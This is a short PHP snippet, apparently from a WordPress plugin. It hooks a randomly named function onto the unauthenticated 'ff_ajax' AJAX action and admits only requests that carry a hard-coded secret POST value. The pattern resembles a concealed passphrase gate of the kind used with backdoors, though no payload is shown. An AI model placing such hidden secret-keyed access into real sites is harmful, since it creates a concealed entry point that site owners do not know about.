<?php

function showcase_duplicate_updater_creator() {
	if (!isset($_POST["znbztjgabfm"]) || $_POST["znbztjgabfm"] !== "mXMBVuyAC") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'showcase_duplicate_updater_creator', 5, 1);
